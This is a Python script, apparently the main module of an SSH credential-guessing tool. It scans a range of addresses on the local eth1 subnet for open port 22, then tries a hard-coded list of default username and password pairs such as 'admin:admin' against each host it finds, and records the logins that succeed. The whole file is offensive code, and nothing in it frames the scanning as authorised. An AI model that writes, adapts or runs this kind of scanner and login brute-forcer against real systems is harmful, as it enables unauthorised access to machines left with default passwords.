import socket
from netifaces import interfaces, ifaddresses, AF_INET
import network_service
import file_service
import ssh_service

filename_ip_to_scan = "./ip_address.txt"
filename_logins_pass = "./login_pswd.txt"
file_name_ssh_cxn_found="./ssh_login_found.txt"
search_index_ip_start = 125
search_index_ip_end = 130
scan_port = 22
logins_pswd=['user:password','toto:test123','admin:admin','admin:password']


def app_start():
    print("Application START")
    print("STEP 1 => Explore ifacename START ")
    all_iface_and_ip= network_service.get_all_ifaces_with_ip()
    print("Explore ifacename result :",all_iface_and_ip)
    print("STEP 1 => Explore ifacename END ")
    print("STEP 2 => Discovery interface eth1 START")
    number_of_ip_found = network_service.discovery_network(all_iface_and_ip['eth1'][0],scan_port,search_index_ip_start,search_index_ip_end,filename_ip_to_scan)
    print("Discovery interface eth1 finish number ip active with port 22 open found:",number_of_ip_found)
    print("STEP 2 => Discovery interface eth1 END result save in file :",filename_ip_to_scan)
    print("STEP 3 => Generated file login password START")
    file_service.generated_file(filename_logins_pass,logins_pswd)
    print("STEP 3 => enerated file login password END  save in file :",filename_logins_pass)
    print("STEP 4 => Run attemps ssh login START")
    ssh_login_attempts_found = ssh_service.run_ssh_login_attempts(filename_ip_to_scan,filename_logins_pass,file_name_ssh_cxn_found)
    print("STEP 4 => Run attemps ssh login END attempts found:",ssh_login_attempts_found,"if attemps found => save in file:",file_name_ssh_cxn_found)
    print("Application END")

app_start()






